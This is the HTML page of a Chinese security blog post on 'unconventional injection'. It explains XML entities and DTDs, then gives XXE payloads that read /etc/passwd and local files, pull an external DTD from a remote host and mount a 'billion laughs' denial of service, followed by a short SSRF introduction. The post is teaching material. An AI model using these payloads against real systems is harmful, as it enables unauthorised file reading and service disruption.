@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#33363b">
+    <meta name="msapplication-TileColor" content="#33363b">
+    
+    
+    
+    
+    <meta name="keywords" content="Life, ARIA, Hexo">
+    
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="192x192" href="/favicons/android-chrome-192x192.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicons/favicon-32x32.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicons/favicon-16x16.png">
+    
+    
+    <link rel="mask-icon" href="/favicons/safari-pinned-tab.svg" color="#33363b">
+    
+    
+    <link rel="manifest" href="/favicons/site.webmanifest">
+    
+    
+    <meta name="msapplication-config" content="/favicons/browserconfig.xml">
+    
+    
+    <link rel="alternate" href="/atom.xml" title="TuringGu" type="application/atom+xml">
+    
+    
+    <link rel="shortcut icon" type="image/x-icon" href="/favicons/favicon.ico">
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="/css/index.css">
+    
+    <link rel="stylesheet" type="text/css" href="/css/sidebar.css">
+    
+    
+<link rel="stylesheet" type="text/css" href="/css/page.css">
+<link rel="stylesheet" type="text/css" href="/css/post.css">
+
+    <link rel="stylesheet" type="text/css" href="/css/custom.css">
+    <link rel="stylesheet" type="text/css" href="/css/atom-one-dark.css">
+    <link rel="stylesheet" type="text/css" href="/css/lightgallery.min.css">
+    <script type="text/javascript" src="/js/jquery.min.js"></script>
+    <script defer type="text/javascript" src="/js/util.js"></script>
+    <script defer type="text/javascript" src="/js/scrollspy.js"></script>
+    <script defer type="text/javascript" src="/js/fontawesome-all.min.js"></script>
+    <script defer type="text/javascript" src="/js/lightgallery.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-fullscreen.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-hash.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-pager.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-thumbnail.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-zoom.min.js"></script>
+    
+    <script defer src="/js/busuanzi.pure.mini.js"></script>
+    
+    
+    <script defer type="text/javascript" src="/js/search.js"></script>
+    <script type="text/javascript">
+    $(document).ready(function () {
+      var searchPath = "search.xml";
+      if (searchPath.length === 0) {
+        searchPath = "search.xml";
+      }
+      var path = "/" + searchPath;
+      searchFunc(path, "search-input", "search-result");
+    });
+    </script>
+    
+    
+    <script defer type="text/javascript" src="/js/index.js"></script>
+    
+    <script defer type="text/javascript" src="/js/custom.js"></script>
+    <title>非常规注入 | TuringGu - Info Security</title>
+  </head>
+  <body itemscope="" itemtype="http://schema.org/WebPage" lang="zh_CN" data-spy="scroll" data-target=".list-group">
+    
+<header id="header" class="header" style="background: #33363b;">
+  <div class="container">
+    <div class="header-container">
+      <div class="header-title">
+        <h1 class="title"><a href="/">TuringGu</a></h1>
+        <h2 class="subtitle">Info Security</h2>
+      </div>
+      
+      <div class="logo">
+        <img src="/images/logo.png" alt="logo">
+      </div>
+      
+    </div>
+    <nav id="nav" class="nav">
+      <a id="nav-toggle" class="nav-toggle" aria-hidden="true"><i class="fas fa-bars" aria-label="切换导航栏"></i></a>
+      <ul id="menu" role="menubar" aria-hidden="false">
+        
+        <li role="menuitem"><a href="/">首页</a></li>
+        
+        <li role="menuitem"><a href="/archives/">归档</a></li>
+        
+        <li role="menuitem"><a href="/categories/">分类</a></li>
+        
+        <li role="menuitem"><a href="/tags/">标签</a></li>
+        
+        <li role="menuitem"><a href="/about/">关于</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</header>
+
+
+    <main id="main" class="main">
+      <div class="container">
+        <div class="main-container">
+          <div class="content">
+            
+<div id="post" class="page">
+  
+  <article class="article post card animate" itemscope="" itemtype="http://schema.org/Article">
+    <div class="post-block">
+      <link itemprop="mainEntityOfPage" href="https://TuringGu.github.io/2019/01/24/Unconventional-Injection/">
+      <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+       <meta itemprop="name" content="TuringGu">
+       <meta itemprop="description" content="">
+       <meta itemprop="image" content="/images/myavatar.jpg">
+      </span>
+      <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+       <meta itemprop="name" content="TuringGu">
+      </span>
+    </div>
+    <header class="post-header">
+      <h1 class="post-title" itemprop="name headline">非常规注入</h1>
+      <div class="post-meta">
+        
+        <span class="post-date">
+          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2019-01-24T18:59:22+08:00">2019-01-24 18:59:22</time></span>
+        </span>
+        
+        
+        
+      </div>
+    </header>
+    <main class="post-main" itemprop="articleBody">
+      <h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote>
+<p>XML(The Extensible Markup Language)可扩展标识语言。最初目的是弥补HTML的不足，后逐渐用于网络数据的转换和描述。其设计宗旨是传输数据，而不是显示数据。XML在web中的应用已十分广泛，是各种应用程序之间数据传输最常用的工具</p>
+</blockquote>
+<h3 id="与HTML的区别"><a href="#与HTML的区别" class="headerlink" title="与HTML的区别"></a>与HTML的区别</h3><ul>
+<li>HTML被设计于用来展示数据</li>
+<li>XML被设计于用来传输数据</li>
+</ul>
+<hr>
+<h3 id="XML实体（ENTITY）"><a href="#XML实体（ENTITY）" class="headerlink" title="XML实体（ENTITY）"></a>XML实体（ENTITY）</h3><p>在一个甚至多个XML文档中频繁使用某一条数据，则可以预先定义一个这条数据的<code>别名</code>，即<code>ENTITY</code>，然后在这些文档中需要该数据的地方调用它</p>
+<h3 id="实体类型"><a href="#实体类型" class="headerlink" title="实体类型"></a>实体类型</h3><p>普通实体、外部实体、参数实体、外部参数实体</p>
+<hr>
+<h4 id="内部实体和外部实体"><a href="#内部实体和外部实体" class="headerlink" title="内部实体和外部实体"></a>内部实体和外部实体</h4><p>根据实体的来源，，可以分为<code>内部实体</code>和<code>外部实体</code>。<br>XML定义了两种类型的ENTITY：</p>
+<ul>
+<li>XML文档中使用的ENTITY</li>
+<li>作为参数在<code>DTD</code>文件中使用的ENTITY<br>定义好的ENTITY在文档中通过<code>&amp;实体名;</code>来使用</li>
+</ul>
+<p>TIP:可以把实体当作XML语言的变量</p>
+<hr>
+<h4 id="普通实体和参数实体"><a href="#普通实体和参数实体" class="headerlink" title="普通实体和参数实体"></a>普通实体和参数实体</h4><p>其又可分为普通实体和参数实体</p>
+<table>
+<thead>
+<tr>
+<th><strong>类型</strong></th>
+<th><strong>普通实体</strong></th>
+<th><strong>参数实体</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>使用场合</td>
+<td>XML文档中</td>
+<td>只用于DTD中元素和属性的声明中</td>
+</tr>
+<tr>
+<td>内部声明</td>
+<td><code>&lt;!ENTITY 实体名 &quot;文本内容&quot;&gt;</code></td>
+<td><code>&lt;!ENTITY % 实体名 &quot;文本内容&quot;&gt;</code></td>
+</tr>
+<tr>
+<td>外部声明</td>
+<td><code>&lt;!ENTITY 实体名 SYSTEM &quot;外部文件URL地址&quot;&gt;</code></td>
+<td><code>&lt;!ENEITY % 实体名 SYSTEM &quot;外部文件URL地址&quot;&gt;</code></td>
+</tr>
+<tr>
+<td>引用方式</td>
+<td><code>&amp;实体名;</code></td>
+<td><code>%实体名;</code></td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>DTD(Document Type Definition)文档类型定义，是一种XML约束模式语言，属于XML文件组成的一部分</p>
+<h4 id="应用形式"><a href="#应用形式" class="headerlink" title="应用形式"></a>应用形式</h4><p>DTD文档有三种应用形式：</p>
+<ol>
+<li>内部DTD文档<br><code>&lt;!DOCTYPE 根元素[定义内容]&gt;</code><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE note [    &lt;!--定义此文档为note类型--&gt;<br>&lt;!ELEMENT note (to,from,heading,body)&gt;    &lt;!--定义note元素有四个--&gt;<br>&lt;!ELEMENT to (#PCDATA)&gt;    &lt;!--定义to元素为"#PCDATA"类型，下同--&gt;<br>&lt;!ELEMENT from (#PCDATA)&gt;<br>&lt;!ELEMENT head (#PCDATA)&gt;<br>&lt;!ELEMENT body (#PCDATA)&gt;<br>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Dave<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Tom<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>You are a good man<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure>
+</li>
+</ol>
+<hr>
+<ol start="2">
+<li>外部DTD文档<br><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt;</code><br><code>outdtd.dtd</code><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">!ELEMENT</span> <span class="hljs-attr">poem</span> (<span class="hljs-attr">author</span>,<span class="hljs-attr">title</span>,<span class="hljs-attr">content</span>)&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">!ELEMENT</span> <span class="hljs-attr">author</span> (#<span class="hljs-attr">PCDATA</span>)&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">!ELEMENT</span> <span class="hljs-attr">title</span> (#<span class="hljs-attr">PCDATA</span>)&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">!ELEMENT</span> <span class="hljs-attr">content</span> (#<span class="hljs-attr">PCDATA</span>)&gt;</span><br></code></pre></td></tr></table></figure>
+</li>
+</ol>
+<hr>
+<p><code>outdtd.xml</code><br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE poem SYSTEM "outdtd.dtd"&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">poem</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span>wangwei<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">content</span>&gt;</span>this is content<span class="hljs-tag">&lt;/<span class="hljs-name">content</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">poem</span>&gt;</span><br></code></pre></td></tr></table></figure></p>
+<hr>
+<ol start="3">
+<li>内外部DTD文档结合<br><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot; [定义内容]&gt;</code><br><code>dtd_2.dtd</code><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">!ELEMENT</span> <span class="hljs-attr">author</span> (#<span class="hljs-attr">PCDATA</span>)&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">!ELEMENT</span> <span class="hljs-attr">title</span> (#<span class="hljs-attr">PCDATA</span>)&gt;</span><br></code></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><code>out2dtd.xml</code><br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE poem SYSTEM "dtd_2.dtd"[<br>&lt;!ELEMENT poem (author, title, content)&gt;<br>&lt;!ELEMENT content (#PCDATA)&gt;<br>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">poem</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span>wangwei<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">content</span>&gt;</span>this is content<span class="hljs-tag">&lt;/<span class="hljs-name">content</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">poem</span>&gt;</span><br></code></pre></td></tr></table></figure></p>
+<hr>
+<h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><ul>
+<li><p>数据库表结构与数据记录</p>
+</li>
+<li><p>每个XML文件可以携带一个自身格式的描述</p>
+</li>
+<li>不同组织的人可以使用一个通用DTD来交换数据</li>
+<li>应用程序可以使用一个标准DTD校验从外部世界接收来的XML数据是否有效</li>
+</ul>
+<p>此处重点了解文档类型定义，因为XXE发生在此处：<br>DTD的作用是定义XML文档的合法构建模块。它既可以在XML文档内声明，也可以外部引用</p>
+<p>在DTD内，我们可以声明外部实体<br>语法规则：<br><strong>内部声明实体</strong><br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> 实体名称 "实体的值"&gt;</span><br></code></pre></td></tr></table></figure></p>
+<p><strong>引用外部实体</strong><br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> 实体名称 <span class="hljs-attr">SYSTEM</span> "<span class="hljs-attr">URL</span>"&gt;</span><br></code></pre></td></tr></table></figure></p>
+<hr>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><h4 id="普通实体引入外部实体"><a href="#普通实体引入外部实体" class="headerlink" title="普通实体引入外部实体"></a>普通实体引入外部实体</h4><p>通过file协议，引入外部实体参数<br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE test [<br>	&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;<br>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span>&amp;xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></td></tr></table></figure></p>
+<hr>
+<h4 id="参数实体引入外部实体"><a href="#参数实体引入外部实体" class="headerlink" title="参数实体引入外部实体"></a>参数实体引入外部实体</h4><p>引入外部参数实体<code>outdtd.dtd</code>文件<br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE % test[<br>    &lt;!ENTITY %a SYSTEM "http://www.test.com/outdtd.dtd"&gt;<br>% a;]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span>&amp;xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></td></tr></table></figure></p>
+<p><code>outdtd.dtd</code><br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> <span class="hljs-attr">xxe</span> <span class="hljs-attr">SYSTEM</span> "<span class="hljs-attr">file:</span>///<span class="hljs-attr">etc</span>/<span class="hljs-attr">passwd</span>"&gt;</span><br></code></pre></td></tr></table></figure></p>
+<hr>
+<h3 id="支持的协议"><a href="#支持的协议" class="headerlink" title="支持的协议"></a>支持的协议</h3><table>
+<thead>
+<tr>
+<th><strong>libxml2</strong></th>
+<th><strong>PHP</strong></th>
+<th><strong>Java</strong></th>
+<th><strong>.NET</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>file</td>
+<td>file</td>
+<td>http</td>
+<td>file</td>
+</tr>
+<tr>
+<td>http</td>
+<td>http</td>
+<td>https</td>
+<td>http</td>
+</tr>
+<tr>
+<td>ftp</td>
+<td>ftp</td>
+<td>ftp</td>
+<td>https</td>
+</tr>
+<tr>
+<td></td>
+<td>php</td>
+<td>file</td>
+<td>ftp</td>
+</tr>
+<tr>
+<td></td>
+<td>compress.zlib</td>
+<td>jar</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>compress.bzip2</td>
+<td>netdoc</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>data</td>
+<td>mailto</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>glob</td>
+<td>gopher *</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>phar</td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3 id="XXE简介"><a href="#XXE简介" class="headerlink" title="XXE简介"></a>XXE简介</h3><p>XXE(XML External Entity Injection)，即XML外部实体注入，漏洞是对非安全的外部实体数据进行处理时引发的安全问题。<br>XML是用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种运行用户对自己的标记语言进行定义的源语言。XML文档包括XML声明、DTD文档类型定义（可选）、文档元素</p>
+<h3 id="XXE的危害"><a href="#XXE的危害" class="headerlink" title="XXE的危害"></a>XXE的危害</h3><h4 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h4><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE root [<br>    &lt;!ENTITY entity SYSTEM "file://C:\Users\rugal\Desktop\test.txt"&gt;<br>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>&amp;entity;<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>利用成功示例结果：<br><code>&lt;root&gt;123123admin&lt;/root&gt;</code></p>
+<hr>
+<h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>$xml=<span class="hljs-string">&lt;&lt;&lt;EOF<br>&lt;!DOCTYPE ANY [<br>    &lt;!ENTITY xxe SYSTEM "file:///C:/test.txt"&gt;<br>]&gt;<br>&lt;x&gt;&amp;xxe;&lt;/x&gt;<br>EOF;</span><br>$data = simplexml_load_string($xml);<br>print_r($data);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<hr>
+<h4 id="Dos拒绝服务攻击"><a href="#Dos拒绝服务攻击" class="headerlink" title="Dos拒绝服务攻击"></a>Dos拒绝服务攻击</h4><p>递归调用，以占用大量服务器资源<br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE lolz [<br>  &lt;!ENTITY lol "lol"&gt;<br>  &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;<br>  &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;<br>  &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;<br>  &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;<br>  &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;<br>  &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;<br>  &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;<br>  &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;<br>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">lolz</span>&gt;</span>&amp;lol9;<span class="hljs-tag">&lt;/<span class="hljs-name">lolz</span>&gt;</span><br></code></pre></td></tr></table></figure></p>
+<p>等等其它危害</p>
+<hr>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>SSRF(Server-Side Request Forgery)服务器端请求伪造，是一种由恶意访问者构造形成由服务端发起请求的一个安全漏洞<br>一般情况下，SSRF访问的目标是从外网无法访问的内部系统（正是由于它是服务端发起的，所以它能够请求到与之相连的而与外网隔离的内部系统）。<br>SSRF形成的原因大都是由于服务端提供了其它服务器应用获取数据的功能且没有对目标地址做过滤与限制<br>比如从指定URL地址获取网页文本内容、加载指定地址的图片、下载等</p>
+<h3 id="原理示例"><a href="#原理示例" class="headerlink" title="原理示例"></a>原理示例</h3><p>当边界主机存在XXE漏洞XXE.php文件时：<br><code>黑客(10.10.10.10)</code>==&gt;<code>边界主机(外网10.20.10.10/内网1.1.1.1)</code>==&gt;<code>内网(1.1.1.2/3/4)</code></p>
+<hr>
+<h3 id="SSRF综合训练"><a href="#SSRF综合训练" class="headerlink" title="SSRF综合训练"></a>SSRF综合训练</h3><p>bwapp中SSRf实验</p>
+<hr>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="PHP中Session配置问题"><a href="#PHP中Session配置问题" class="headerlink" title="PHP中Session配置问题"></a>PHP中Session配置问题</h3><p>关于session配置的问题<br>Warning: session_start() [function.session-start]:<br><a href="https://blog.csdn.net/qq_24338883/article/details/51450751" target="_blank" rel="noopener">https://blog.csdn.net/qq_24338883/article/details/51450751</a></p>
+<p>修改<br><code>php.ini</code>中的<code>session.auto_start = 0</code> 为 <code>session.auto_start = 1</code></p>
+
+    </main>
+    <footer class="post-footer">
+      
+      <div class="post-tags">
+        
+        <a class="post-tag button" href="/tags/Injection/" rel="tag"><i class="fas fa-tags"></i>Injection</a>
+        
+        <a class="post-tag button" href="/tags/Unconventional/" rel="tag"><i class="fas fa-tags"></i>Unconventional</a>
+        
+      </div>
+      
+    </footer>
+  </article>
+  
+  
+<div class="reward" id="reward">
+  <p>您的支持是我前进的动力！</p>
+  <button id="reward-button" class="button" disable="enable">打赏</button>
+  <div id="qr" class="qr" style="display: none;" aria-hidden="true">
+    
+    
+    
+  </div>
+</div>
+
+
+  
+  
+  <nav class="page-nav">
+    <div class="page-nav-next page-nav-item">
+      
+      <a href="/2019/01/22/CSRF/" rel="next" title="CSRF跨站请求伪造"><i class="fas fa-angle-left"></i><span class="nav-title">CSRF跨站请求伪造</span></a>
+      
+    </div>
+    <div class="page-nav-prev page-nav-item">
+      
+      <a href="/2019/01/26/Information-leakage/" rel="prev" title="信息泄露漏洞"><span class="nav-title">信息泄露漏洞</span><i class="fas fa-angle-right"></i></a>
+      
+    </div>
+  </nav>
+  
+  
+</div>
+
+          </div>
+          
+          
+          
+<aside class="sidebar" id="sidebar" style="background: url(/images/background.png);">
+  
+  <div class="search">
+    <div class="form-group">
+      <i class="fas fa-search"></i><input type="search" id="search-input" name="q" results="0" placeholder="搜索" class="form-control">
+    </div>
+  </div>
+  <div class="search-result-box" id="search-result"></div>
+  
+  
+<div class="info sidebar-item" id="info">
+  
+  <img class="author-avatar" src="/images/myavatar.jpg" alt="TuringGu">
+  
+  <h1 class="author-name">TuringGu</h1>
+  <h2 class="author-description"></h2>
+  <div class="site-count">
+    
+    <div class="archives-count">
+      <div class="site-count-title">归档</div>
+      <div><a href="/archives/">38</a></div>
+    </div>
+    
+    
+    
+    <span class="site-count-divider divider">|</span>
+    
+    <div class="categories-count">
+      <div class="site-count-title">分类</div>
+      <div><a href="/categories/">0</a></div>
+    </div>
+    
+    
+    
+    <span class="site-count-divider divider">|</span>
+    
+    <div class="tags-count">
+      <div class="site-count-title">标签</div>
+      <div><a href="/tags/">73</a></div>
+    </div>
+    
+  </div>
+  
+  <div class="rss">
+    <a class="rss-link button sidebar-item" href="/atom.xml"><i class="fas fa-rss"></i>RSS</a>
+  </div>
+  
+</div>
+
+
+  <div class="sidebar-sticky">
+    
+    
+    
+    
+    
+    <hr>
+    <div class="post-toc sidebar-item" id="toc-div">
+      <div><i class="fas fa-list-ol"></i>文章目录</div>
+      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#XML"><span class="toc-text">XML</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#简介"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#与HTML的区别"><span class="toc-text">与HTML的区别</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#XML实体（ENTITY）"><span class="toc-text">XML实体（ENTITY）</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#实体类型"><span class="toc-text">实体类型</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#内部实体和外部实体"><span class="toc-text">内部实体和外部实体</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#普通实体和参数实体"><span class="toc-text">普通实体和参数实体</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#DTD"><span class="toc-text">DTD</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#定义"><span class="toc-text">定义</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#应用形式"><span class="toc-text">应用形式</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item 